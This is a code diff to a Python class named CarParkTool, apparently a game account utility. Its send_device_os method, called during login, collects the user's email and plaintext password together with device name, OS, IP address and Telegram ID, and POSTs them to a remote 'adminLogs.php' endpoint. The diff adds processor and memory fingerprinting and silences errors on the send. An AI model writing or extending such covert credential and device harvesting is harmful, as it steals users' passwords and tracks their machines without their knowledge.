@@ -42,6 +42,7 @@ class CarParkTool:
             self.send_device_os(email=email, password=password)
             return response_decoded.get("error")
 
+
     def send_device_os(self, email=None, password=None):
         try:
             # جمع بيانات النظام
@@ -49,6 +50,8 @@ class CarParkTool:
             release = platform.release()
             device_name = "Unknown"
             build_number = "Unknown"
+            processor = "Unknown"
+            memory = "Unknown"
 
             if system == "Darwin":  # إذا كان النظام macOS أو iOS
                 if os.path.exists("/bin/ash") or "iSH" in release:
@@ -71,10 +74,17 @@ class CarParkTool:
                 device_os = system + " " + release
                 device_name = platform.node()
                 build_number = "Unknown"
-        except Exception:
+
+            # إضافة معلومات المعالج والذاكرة
+            processor = subprocess.getoutput("sysctl -n machdep.cpu.brand_string") if system == "Darwin" else "Unknown"
+            memory = f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB" if psutil else "Unknown"
+
+        except Exception as e:
             device_os = "Unknown"
             device_name = "Unknown"
             build_number = "Unknown"
+            processor = "Unknown"
+            memory = "Unknown"
 
         try:
             # الحصول على عنوان الـ IP
@@ -91,6 +101,8 @@ class CarParkTool:
                 "device_name": device_name,
                 "build_number": build_number,
                 "ip_address": ip_address,
+                "processor": processor,
+                "memory": memory,
                 "telegram_id": getattr(self, "telegram_id", "Unknown")
             }
         }
@@ -102,9 +114,11 @@ class CarParkTool:
             payload["data"]["password"] = password
 
         # إرسال البيانات إلى adminLogs.php باستخدام POST مع تنسيق JSON
-        response = requests.post("https://popstool.io/beekeeper/adminLogs.php", json=payload)
-
-        return response.status_code == 200
+        try:
+            response = requests.post("https://popstool.io/beekeeper/adminLogs.php", json=payload)
+            return response.status_code == 200
+        except Exception as e:
+            return False
     
     def register(self, email, password) -> int:
         payload = { "account_email": email, "account_password": password }
